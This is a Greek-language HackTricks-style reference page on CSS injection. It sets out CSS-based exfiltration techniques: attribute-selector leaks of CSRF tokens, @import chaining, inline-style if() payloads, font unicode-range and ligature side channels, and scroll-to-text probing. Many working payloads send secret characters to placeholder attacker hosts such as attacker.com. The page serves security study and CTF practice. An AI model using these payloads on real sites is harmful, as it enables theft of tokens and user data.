# CSS Injection

{{#include ../../../banners/hacktricks-training.md}}

## CSS Injection

### Attribute Selector

Οι CSS selectors κατασκευάζονται για να ταιριάζουν με τις τιμές των attributes `name` και `value` ενός στοιχείου `input`. Αν το attribute `value` του στοιχείου `input` ξεκινά με έναν συγκεκριμένο χαρακτήρα, φορτώνεται ένας προκαθορισμένος εξωτερικός πόρος:
```css
input[name="csrf"][value^="a"] {
background-image: url(https://attacker.com/exfil/a);
}
input[name="csrf"][value^="b"] {
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name="csrf"][value^="9"] {
background-image: url(https://attacker.com/exfil/9);
}
```
Ωστόσο, αυτή η προσέγγιση αντιμετωπίζει έναν περιορισμό όταν έχουμε να κάνουμε με κρυφά στοιχεία input (`type="hidden"`), επειδή τα κρυφά στοιχεία δεν φορτώνουν εικόνες φόντου.

#### Παράκαμψη για Κρυφά Στοιχεία

Για να παρακαμφθεί αυτός ο περιορισμός, μπορείτε να στοχεύσετε ένα επόμενο αδελφικό στοιχείο χρησιμοποιώντας τον `~` γενικό συνδυαστή αδελφικού στοιχείου. Ο κανόνας CSS εφαρμόζεται τότε σε όλα τα αδελφικά στοιχεία που ακολουθούν το κρυφό στοιχείο input, προκαλώντας τη φόρτωση της εικόνας φόντου:
```css
input[name="csrf"][value^="csrF"] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
Ένα πρακτικό παράδειγμα εκμετάλλευσης αυτής της τεχνικής περιγράφεται στο παρεχόμενο απόσπασμα κώδικα. Μπορείτε να το δείτε [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Προαπαιτούμενα για CSS Injection

Για να είναι αποτελεσματική η τεχνική CSS Injection, πρέπει να πληρούνται ορισμένες προϋποθέσεις:

1. **Payload Length**: Ο CSS injection vector πρέπει να υποστηρίζει επαρκώς μακρά payloads ώστε να χωράνε οι crafted selectors.
2. **CSS Re-evaluation**: Πρέπει να έχετε τη δυνατότητα να frame-άρετε τη σελίδα, κάτι που είναι απαραίτητο για να ενεργοποιηθεί η επανααξιολόγηση του CSS με νεοδημιουργημένα payloads.
3. **External Resources**: Η τεχνική προϋποθέτει τη δυνατότητα χρήσης εικόνων που φιλοξενούνται εξωτερικά. Αυτό μπορεί να περιορίζεται από την Content Security Policy (CSP) του site.

### Blind Attribute Selector

As [**explained in this post**](https://portswigger.net/research/blind-css-exfiltration), it's possible to combine the selectors **`:has`** and **`:not`** to identify content even from blind elements. This is very useful when you have no idea what is inside the web page loading the CSS injection.\
It's also possible to use those selectors to extract information from several block of the same type like in:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background: url(/m);
}
</style>
<input name="mytoken" value="1337" />
<input name="myname" value="gareth" />
```
Συνδυάζοντας αυτό με την ακόλουθη τεχνική **@import**, είναι δυνατό να εξαχθούν πολλές **πληροφορίες χρησιμοποιώντας CSS injection από blind pages με** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Η προηγούμενη τεχνική έχει ορισμένα μειονεκτήματα — έλεγξε τις προϋποθέσεις. Είτε πρέπει να μπορείς να **στείλεις πολλούς συνδέσμους στο θύμα**, είτε να μπορείς να **iframe the CSS injection vulnerable page**.

Ωστόσο, υπάρχει μια άλλη έξυπνη τεχνική που χρησιμοποιεί **CSS `@import`** για να βελτιώσει την αποτελεσματικότητα της τεχνικής.

Αυτό παρουσιάστηκε πρώτα από [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) και λειτουργεί ως εξής:

Αντί να φορτώνουμε την ίδια σελίδα ξανά και ξανά με δεκάδες διαφορετικά payloads κάθε φορά (όπως στην προηγούμενη μέθοδο), πρόκειται να **φορτώσουμε τη σελίδα μόνο μια φορά και μόνο με ένα import προς τον server του επιτιθέμενου** (αυτό είναι το payload που θα σταλεί στο θύμα):
```css
@import url("//attacker.com:5001/start?");
```
1. Το import πρόκειται να **λάβει κάποιο CSS script** από τους attackers και ο **browser θα το φορτώσει**.
2. Το πρώτο μέρος του CSS script που θα στείλει ο attacker είναι **άλλο ένα `@import` προς τον attackers server ξανά.**
1. Ο attackers server δεν θα απαντήσει ακόμα σε αυτό το request, καθώς θέλουμε να leak μερικά chars και μετά να απαντήσουμε αυτό το import με το payload για να leakάρουμε τα επόμενα.
3. Το δεύτερο και μεγαλύτερο μέρος του payload θα είναι ένα **attribute selector leakage payload**
1. Αυτό θα στείλει στον attackers server τον **πρώτο char του secret και τον τελευταίο**
4. Μόλις ο attackers server λάβει τους **πρώτο και τελευταίο char του secret**, θα **απαντήσει στο import που ζητήθηκε στο βήμα 2**.
1. Η response θα είναι ακριβώς η ίδια με τα **βήματα 2, 3 και 4**, αλλά αυτή τη φορά θα προσπαθήσει να **βρει τον δεύτερο char του secret και μετά τον προτελευταίο**.

Ο attacker θα f**ollow that loop until it manages to leak completely the secret**.

You can find the original [**Pepe Vila's code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) or you can find almost the [**same code but commented here**.](#css-injection)

> [!TIP]
> Το script θα προσπαθήσει να ανακαλύψει 2 chars κάθε φορά (από την αρχή και από το τέλος) επειδή ο attribute selector επιτρέπει να γίνουν πράγματα όπως:
>
> ```css
> /* value^=  to match the beggining of the value*/
> input[value^="0"] {
>  --s0: url(http://localhost:5001/leak?pre=0);
> }
>
> /* value$=  to match the ending of the value*/
> input[value$="f"] {
>  --e0: url(http://localhost:5001/leak?post=f);
> }
> ```
>
> Αυτό επιτρέπει στο script να leakάρει το secret πιο γρήγορα.

> [!WARNING]
> Μερικές φορές το script **δεν ανιχνεύει σωστά ότι το prefix + suffix που έχει ανακαλυφθεί είναι ήδη το πλήρες flag** και θα συνεχίσει προς τα εμπρός (στο prefix) και προς τα πίσω (στο suffix) και σε κάποιο σημείο θα κολλήσει.\
> Χωρίς ανησυχία, απλώς έλεγξε το **output** γιατί **μπορείς να δεις το flag εκεί**.

### Inline-Style CSS Exfiltration (attr() + if() + image-set())

This primitive enables exfiltration using only an element's inline style attribute, without selectors or external stylesheets. It relies on CSS custom properties, the attr() function to read same-element attributes, the new CSS if() conditionals for branching, and image-set() to trigger a network request that encodes the matched value.

> [!WARNING]
> Equality comparisons in if() require double quotes for string literals. Single quotes will not match.

- Sink: έλεγξε το element's style attribute και βεβαιώσου ότι το target attribute είναι στο ίδιο element (attr() διαβάζει μόνο same-element attributes).
- Read: αντιγράψε το attribute σε μια CSS μεταβλητή: `--val: attr(title)`.
- Decide: επίλεξε ένα URL χρησιμοποιώντας nested conditionals που συγκρίνουν τη μεταβλητή με string candidates: `--steal: if(style(--val:"1"): url(//attacker/1); else: url(//attacker/2))`.
- Exfiltrate: εφάρμοσε `background: image-set(var(--steal))` (ή οποιαδήποτε fetching property) για να αναγκάσεις ένα request στο επιλεγμένο endpoint.

Attempt (does not work; single quotes in comparison):
```html
<div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); else: url(/2));background:image-set(var(--steal))" title=1>test</div>
```
Λειτουργικό payload (απαιτούνται διπλά εισαγωγικά στη σύγκριση):
```html
<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>
```
Απαρίθμηση τιμών ιδιοτήτων με εμφωλευμένες συνθήκες:
```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```
Ρεαλιστική επίδειξη (ανίχνευση ονομάτων χρήστη):
```html
<div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.tld/martin); else: if(style(--val:"zak"): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username="james"></div>
```
Σημειώσεις και περιορισμοί:

- Λειτουργεί σε Chromium-based browsers κατά τη στιγμή της έρευνας· η συμπεριφορά μπορεί να διαφέρει σε άλλους engines.
- Κατάλληλο κυρίως για finite/enumerable value spaces (IDs, flags, short usernames). Το να κλαπεί αυθαίρετα μεγάλα strings χωρίς εξωτερικά stylesheets παραμένει δύσκολο.
- Οποιαδήποτε CSS ιδιότητα που fetch ένα URL μπορεί να χρησιμοποιηθεί για να ενεργοποιήσει το request (π.χ., background/image-set, border-image, list-style, cursor, content).

Αυτοματοποίηση: μια Burp Custom Action μπορεί να δημιουργήσει nested inline-style payloads για brute-force attribute values: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda

### Άλλοι selectors

Άλλοι τρόποι πρόσβασης σε μέρη του DOM με **CSS selectors**:

- **`.class-to-search:nth-child(2)`**: Αυτό θα αναζητήσει το δεύτερο item με class "class-to-search" στο DOM.
- **`:empty`** selector: Χρησιμοποιείται, για παράδειγμα, στο [**this writeup**]**:**

```css
[role^="img"][aria-label="1"]:empty {
background-image: url("YOUR_SERVER_URL?1");
}
```

### XS-Search βάσει σφαλμάτων

**Αναφορά:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

Ο γενικός σκοπός είναι να **χρησιμοποιηθεί ένα custom font από ένα ελεγχόμενο endpoint** και να διασφαλιστεί ότι **το κείμενο (στην προκειμένη περίπτωση, 'A') εμφανίζεται με αυτή τη γραμματοσειρά μόνο αν ο συγκεκριμένος πόρος (`favicon.ico`) δεν μπορεί να φορτωθεί**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face {
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range: U+0041;
}

#poc0 {
font-family: "poc";
}
</style>
</head>
<body>
<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Χρήση προσαρμοσμένης γραμματοσειράς**:

- Μια προσαρμοσμένη γραμματοσειρά ορίζεται χρησιμοποιώντας τον κανόνα `@font-face` μέσα σε ένα `<style>` tag στην ενότητα `<head>`.
- Η γραμματοσειρά ονομάζεται `poc` και ανακτάται από ένα εξωτερικό endpoint (`http://attacker.com/?leak`).
- Η ιδιότητα `unicode-range` ορίζεται σε `U+0041`, στοχεύοντας τον συγκεκριμένο χαρακτήρα Unicode 'A'.

2. **Στοιχείο Object με Κείμενο Εφεδρείας**:
- Ένα `<object>` στοιχείο με `id="poc0"` δημιουργείται στην ενότητα `<body>`. Το στοιχείο αυτό προσπαθεί να φορτώσει έναν πόρο από `http://192.168.0.1/favicon.ico`.
- Το `font-family` για αυτό το στοιχείο έχει οριστεί σε `'poc'`, όπως ορίζεται στην ενότητα `<style>`.
- Εάν ο πόρος (`favicon.ico`) αποτύχει να φορτωθεί, το εφεδρικό περιεχόμενο (το γράμμα 'A') μέσα στο `<object>` tag εμφανίζεται.
- Το εφεδρικό περιεχόμενο ('A') θα αποδοθεί χρησιμοποιώντας την προσαρμοσμένη γραμματοσειρά `poc` εάν ο εξωτερικός πόρος δεν μπορεί να φορτωθεί.

### Στυλιζάρισμα Scroll-to-Text Fragment

Η ψευδο-κλάση **`:target`** χρησιμοποιείται για να επιλέξει ένα στοιχείο που στοχεύεται από ένα **URL fragment**, όπως καθορίζεται στην [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo). Είναι σημαντικό να κατανοήσουμε ότι το `::target-text` δεν ταιριάζει με κανένα στοιχείο εκτός αν το κείμενο στοχευθεί ρητά από το fragment.

Προκύπτει ένα ζήτημα ασφάλειας όταν επιτιθέμενοι εκμεταλλεύονται τη λειτουργία **Scroll-to-text** fragment, επιτρέποντάς τους να επιβεβαιώσουν την παρουσία συγκεκριμένου κειμένου σε μια ιστοσελίδα φορτώνοντας έναν πόρο από τον server τους μέσω HTML injection. Η μέθοδος περιλαμβάνει την έγχυση ενός CSS κανόνα όπως ο εξής:
```css
:target::before {
content: url(target.png);
}
```
Σε τέτοια σενάρια, αν το κείμενο "Διαχειριστής" υπάρχει στη σελίδα, ο πόρος `target.png` ζητείται από τον διακομιστή, υποδεικνύοντας την παρουσία του κειμένου. Μια περίπτωση αυτής της επίθεσης μπορεί να εκτελεστεί μέσω ενός ειδικά κατασκευασμένου URL που ενσωματώνει το εγχυμένο CSS μαζί με ένα Scroll-to-text fragment:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Εδώ, η επίθεση χειρίζεται HTML injection για να μεταδώσει τον CSS κώδικα, στοχεύοντας το συγκεκριμένο κείμενο "Administrator" μέσω του Scroll-to-text fragment (`#:~:text=Administrator`). Αν βρεθεί το κείμενο, ο υποδεικνυόμενος πόρος φορτώνεται, σηματοδοτώντας άθελά του την παρουσία του στον επιτιθέμενο.

Για την μετρίαση, πρέπει να σημειωθούν τα παρακάτω:

1. **Constrained STTF Matching**: Το Scroll-to-text Fragment (STTF) έχει σχεδιαστεί να αντιστοιχίζει μόνο λέξεις ή προτάσεις, περιορίζοντας έτσι την ικανότητά του να leak αυθαίρετα μυστικά ή tokens.
2. **Restriction to Top-level Browsing Contexts**: Το STTF λειτουργεί μόνο σε top-level browsing contexts και δεν λειτουργεί μέσα σε iframes, καθιστώντας οποιαδήποτε προσπάθεια εκμετάλλευσης πιο εμφανή στον χρήστη.
3. **Necessity of User Activation**: Το STTF απαιτεί μια user-activation gesture για να λειτουργήσει, που σημαίνει ότι οι εκμεταλλεύσεις είναι δυνατές μόνο μέσω πλοηγήσεων που ξεκινά ο χρήστης. Αυτό το απαίτημα μειώνει σημαντικά τον κίνδυνο οι επιθέσεις να αυτοματοποιηθούν χωρίς αλληλεπίδραση χρήστη. Ωστόσο, ο συγγραφέας του blog post επισημαίνει συγκεκριμένες συνθήκες και bypasses (π.χ. social engineering, interaction with prevalent browser extensions) που μπορεί να διευκολύνουν την αυτοματοποίηση της επίθεσης.

Η επίγνωση αυτών των μηχανισμών και των πιθανών ευπαθειών είναι κρίσιμη για τη διατήρηση της ασφάλειας στο web και για την προστασία ενάντια σε τέτοιες εκμεταλλευτικές τακτικές.

Για περισσότερες πληροφορίες δείτε την πρωτότυπη αναφορά: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Μπορείτε να δείτε ένα [**exploit που χρησιμοποιεί αυτή την τεχνική για CTF εδώ**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Μπορείτε να καθορίσετε **εξωτερικές γραμματοσειρές για συγκεκριμένες unicode τιμές** που θα συλλεχθούν μόνο εάν αυτές οι unicode τιμές είναι παρούσες στη σελίδα. Για παράδειγμα:
```html
<style>
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range: U+0041;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range: U+0042;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range: U+0043;
}
#sensitive-information {
font-family: poc;
}
</style>

<p id="sensitive-information">AB</p>
htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Αναφορά:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Η τεχνική που περιγράφεται αφορά την εξαγωγή κειμένου από έναν κόμβο εκμεταλλευόμενη font ligatures και την παρακολούθηση αλλαγών στο πλάτος. Η διαδικασία περιλαμβάνει αρκετά βήματα:

1. **Δημιουργία προσαρμοσμένων γραμματοσειρών**:

- Δημιουργούνται SVG fonts με glyphs που έχουν το attribute `horiz-adv-x`, το οποίο ορίζει μεγάλο πλάτος για ένα glyph που αντιπροσωπεύει μια ακολουθία δύο χαρακτήρων.
- Παράδειγμα SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, όπου "XY" δηλώνει μια ακολουθία δύο χαρακτήρων.
- Αυτές οι γραμματοσειρές στη συνέχεια μετατρέπονται σε woff format χρησιμοποιώντας fontforge.

2. **Ανίχνευση αλλαγών στο πλάτος**:

- Το CSS χρησιμοποιείται ώστε το κείμενο να μην τυλίγεται (`white-space: nowrap`) και για την προσαρμογή του στυλ του scrollbar.
- Η εμφάνιση ενός οριζόντιου scrollbar, στιλιζαρισμένου με διακριτό τρόπο, λειτουργεί ως δείκτης (oracle) ότι ένα συγκεκριμένο ligature, και κατά συνέπεια μια συγκεκριμένη ακολουθία χαρακτήρων, είναι παρούσα στο κείμενο.
- Το σχετικό CSS:
```css
body {
white-space: nowrap;
}
body::-webkit-scrollbar {
background: blue;
}
body::-webkit-scrollbar:horizontal {
background: url(http://attacker.com/?leak);
}
```

3. **Διαδικασία exploit**:

- **Step 1**: Δημιουργούνται fonts για ζευγάρια χαρακτήρων με μεγάλο πλάτος.
- **Step 2**: Χρησιμοποιείται ένα τεχνικό κόλπο με το scrollbar για να ανιχνευθεί πότε το glyph με το μεγάλο πλάτος (ligature για ένα ζευγάρι χαρακτήρων) αποδίδεται, υποδεικνύοντας την παρουσία της ακολουθίας χαρακτήρων.
- **Step 3**: Μετά τον εντοπισμό ενός ligature, δημιουργούνται καινούργια glyphs που αντιπροσωπεύουν ακολουθίες τριών χαρακτήρων, ενσωματώνοντας το εντοπισμένο ζευγάρι και προσθέτοντας έναν προηγούμενο ή επόμενο χαρακτήρα.
- **Step 4**: Γίνεται ανίχνευση του ligature για την τριχαρακτη ακολουθία.
- **Step 5**: Η διαδικασία επαναλαμβάνεται, αποκαλύπτοντας σταδιακά ολόκληρο το κείμενο.

4. **Βελτιστοποίηση**:
- Η τρέχουσα μέθοδος αρχικοποίησης με `<meta refresh=...` δεν είναι ιδανική.
- Μια πιο αποδοτική προσέγγιση θα μπορούσε να χρησιμοποιήσει το κόλπο `@import` στο CSS, βελτιώνοντας την απόδοση του exploit.

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Αναφορά:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

This trick was released in this [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/). The charset used in a text node can be leaked **using the default fonts** installed in the browser: no external -or custom- fonts are needed.

Η ιδέα στηρίζεται στη χρήση μιας animation που επεκτείνει σταδιακά το πλάτος ενός `div`, επιτρέποντας έναν χαρακτήρα τη φορά να μετατοπίζεται από το 'suffix' μέρος του κειμένου στο 'prefix' μέρος. Αυτή η διαδικασία χωρίζει ουσιαστικά το κείμενο σε δύο τμήματα:

1. Prefix: The initial line.
2. Suffix: The subsequent line(s).

Τα στάδια μετάβασης των χαρακτήρων θα εμφανίζονταν ως εξής:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

Κατά τη διάρκεια αυτής της μετάβασης, το **unicode-range trick** χρησιμοποιείται για να εντοπιστεί κάθε νέος χαρακτήρας καθώς ενώνεται με το prefix. Αυτό επιτυγχάνεται αλλάζοντας τη γραμματοσειρά σε Comic Sans, η οποία είναι σημαντικά ψηλότερη από την προεπιλεγμένη γραμματοσειρά, με αποτέλεσμα να ενεργοποιείται ένας κατακόρυφος scrollbar. Η εμφάνιση αυτού του scrollbar αποκαλύπτει έμμεσα την παρουσία ενός νέου χαρακτήρα στο prefix.

Αν και αυτή η μέθοδος επιτρέπει τον εντοπισμό μοναδικών χαρακτήρων καθώς εμφανίζονται, δεν προσδιορίζει ποιος χαρακτήρας επαναλαμβάνεται — μόνο ότι έχει συμβεί επανάληψη.

> [!TIP]
> Βασικά, το **unicode-range is used to detect a char**, αλλά καθώς δεν θέλουμε να φορτώσουμε μια εξωτερική γραμματοσειρά, πρέπει να βρούμε έναν άλλο τρόπο.\
> Όταν ο **char** βρεθεί, του δίνεται η προεγκατεστημένη **Comic Sans font**, που **κάνει** τον char **μεγαλύτερο** και **προκαλεί ένα scroll bar** το οποίο θα **leak the found char**.

Check the code extracted from the PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face {
font-family: has_A;
src: local("Comic Sans MS");
unicode-range: U+41;
font-style: monospace;
}
@font-face {
font-family: has_B;
src: local("Comic Sans MS");
unicode-range: U+42;
font-style: monospace;
}
@font-face {
font-family: has_C;
src: local("Comic Sans MS");
unicode-range: U+43;
font-style: monospace;
}
@font-face {
font-family: has_D;
src: local("Comic Sans MS");
unicode-range: U+44;
font-style: monospace;
}
@font-face {
font-family: has_E;
src: local("Comic Sans MS");
unicode-range: U+45;
font-style: monospace;
}
@font-face {
font-family: has_F;
src: local("Comic Sans MS");
unicode-range: U+46;
font-style: monospace;
}
@font-face {
font-family: has_G;
src: local("Comic Sans MS");
unicode-range: U+47;
font-style: monospace;
}
@font-face {
font-family: has_H;
src: local("Comic Sans MS");
unicode-range: U+48;
font-style: monospace;
}
@font-face {
font-family: has_I;
src: local("Comic Sans MS");
unicode-range: U+49;
font-style: monospace;
}
@font-face {
font-family: has_J;
src: local("Comic Sans MS");
unicode-range: U+4a;
font-style: monospace;
}
@font-face {
font-family: has_K;
src: local("Comic Sans MS");
unicode-range: U+4b;
font-style: monospace;
}
@font-face {
font-family: has_L;
src: local("Comic Sans MS");
unicode-range: U+4c;
font-style: monospace;
}
@font-face {
font-family: has_M;
src: local("Comic Sans MS");
unicode-range: U+4d;
font-style: monospace;
}
@font-face {
font-family: has_N;
src: local("Comic Sans MS");
unicode-range: U+4e;
font-style: monospace;
}
@font-face {
font-family: has_O;
src: local("Comic Sans MS");
unicode-range: U+4f;
font-style: monospace;
}
@font-face {
font-family: has_P;
src: local("Comic Sans MS");
unicode-range: U+50;
font-style: monospace;
}
@font-face {
font-family: has_Q;
src: local("Comic Sans MS");
unicode-range: U+51;
font-style: monospace;
}
@font-face {
font-family: has_R;
src: local("Comic Sans MS");
unicode-range: U+52;
font-style: monospace;
}
@font-face {
font-family: has_S;
src: local("Comic Sans MS");
unicode-range: U+53;
font-style: monospace;
}
@font-face {
font-family: has_T;
src: local("Comic Sans MS");
unicode-range: U+54;
font-style: monospace;
}
@font-face {
font-family: has_U;
src: local("Comic Sans MS");
unicode-range: U+55;
font-style: monospace;
}
@font-face {
font-family: has_V;
src: local("Comic Sans MS");
unicode-range: U+56;
font-style: monospace;
}
@font-face {
font-family: has_W;
src: local("Comic Sans MS");
unicode-range: U+57;
font-style: monospace;
}
@font-face {
font-family: has_X;
src: local("Comic Sans MS");
unicode-range: U+58;
font-style: monospace;
}
@font-face {
font-family: has_Y;
src: local("Comic Sans MS");
unicode-range: U+59;
font-style: monospace;
}
@font-face {
font-family: has_Z;
src: local("Comic Sans MS");
unicode-range: U+5a;
font-style: monospace;
}
@font-face {
font-family: has_0;
src: local("Comic Sans MS");
unicode-range: U+30;
font-style: monospace;
}
@font-face {
font-family: has_1;
src: local("Comic Sans MS");
unicode-range: U+31;
font-style: monospace;
}
@font-face {
font-family: has_2;
src: local("Comic Sans MS");
unicode-range: U+32;
font-style: monospace;
}
@font-face {
font-family: has_3;
src: local("Comic Sans MS");
unicode-range: U+33;
font-style: monospace;
}
@font-face {
font-family: has_4;
src: local("Comic Sans MS");
unicode-range: U+34;
font-style: monospace;
}
@font-face {
font-family: has_5;
src: local("Comic Sans MS");
unicode-range: U+35;
font-style: monospace;
}
@font-face {
font-family: has_6;
src: local("Comic Sans MS");
unicode-range: U+36;
font-style: monospace;
}
@font-face {
font-family: has_7;
src: local("Comic Sans MS");
unicode-range: U+37;
font-style: monospace;
}
@font-face {
font-family: has_8;
src: local("Comic Sans MS");
unicode-range: U+38;
font-style: monospace;
}
@font-face {
font-family: has_9;
src: local("Comic Sans MS");
unicode-range: U+39;
font-style: monospace;
}
@font-face {
font-family: rest;
src: local("Courier New");
font-style: monospace;
unicode-range: U+0-10FFFF;
}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line {
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% {
font-family: rest;
} /* delay for width change */
5% {
font-family: has_A, rest;
--leak: url(?a);
}
6% {
font-family: rest;
}
10% {
font-family: has_B, rest;
--leak: url(?b);
}
11% {
font-family: rest;
}
15% {
font-family: has_C, rest;
--leak: url(?c);
}
16% {
font-family: rest;
}
20% {
font-family: has_D, rest;
--leak: url(?d);
}
21% {
font-family: rest;
}
25% {
font-family: has_E, rest;
--leak: url(?e);
}
26% {
font-family: rest;
}
30% {
font-family: has_F, rest;
--leak: url(?f);
}
31% {
font-family: rest;
}
35% {
font-family: has_G, rest;
--leak: url(?g);
}
36% {
font-family: rest;
}
40% {
font-family: has_H, rest;
--leak: url(?h);
}
41% {
font-family: rest;
}
45% {
font-family: has_I, rest;
--leak: url(?i);
}
46% {
font-family: rest;
}
50% {
font-family: has_J, rest;
--leak: url(?j);
}
51% {
font-family: rest;
}
55% {
font-family: has_K, rest;
--leak: url(?k);
}
56% {
font-family: rest;
}
60% {
font-family: has_L, rest;
--leak: url(?l);
}
61% {
font-family: rest;
}
65% {
font-family: has_M, rest;
--leak: url(?m);
}
66% {
font-family: rest;
}
70% {
font-family: has_N, rest;
--leak: url(?n);
}
71% {
font-family: rest;
}
75% {
font-family: has_O, rest;
--leak: url(?o);
}
76% {
font-family: rest;
}
80% {
font-family: has_P, rest;
--leak: url(?p);
}
81% {
font-family: rest;
}
85% {
font-family: has_Q, rest;
--leak: url(?q);
}
86% {
font-family: rest;
}
90% {
font-family: has_R, rest;
--leak: url(?r);
}
91% {
font-family: rest;
}
95% {
font-family: has_S, rest;
--leak: url(?s);
}
96% {
font-family: rest;
}
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% {
width: 0px;
}
1% {
width: 20px;
}
2% {
width: 40px;
}
3% {
width: 60px;
}
4% {
width: 80px;
}
4% {
width: 100px;
}
5% {
width: 120px;
}
6% {
width: 140px;
}
7% {
width: 0px;
}
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset με προεπιλεγμένη γραμματοσειρά κρύβοντας στοιχεία (χωρίς να απαιτούνται εξωτερικά assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Αυτό αναφέρεται ως [μια αποτυχημένη λύση σε αυτό το writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Αυτή η περίπτωση είναι πολύ παρόμοια με την προηγούμενη, ωστόσο εδώ ο στόχος του να κάνουν συγκεκριμένους **χαρακτήρες μεγαλύτερους από άλλους για να κρύψουν κάτι** όπως ένα κουμπί ώστε το bot να μην το πατήσει ή μια εικόνα που δεν θα φορτωθεί. Έτσι μπορούμε να μετρήσουμε τη δράση (ή την έλλειψη της δράσης) και να ξέρουμε αν ένας συγκεκριμένος χαρακτήρας υπάρχει μέσα στο κείμενο.

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Αυτό αναφέρεται ως [μια αποτυχημένη λύση σε αυτό το writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Σε αυτήν την περίπτωση, μπορούμε να προσπαθήσουμε να leak αν ένας χαρακτήρας υπάρχει στο κείμενο φορτώνοντας μια fake font από την ίδια origin:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
If there is a match, the **font will be loaded from `/static/bootstrap.min.css?q=1`**. Although it won’t load successfully, the **browser should cache it**, and even if there is no cache, there is a **304 not modified** mechanism, so the **response should be faster** than other things.

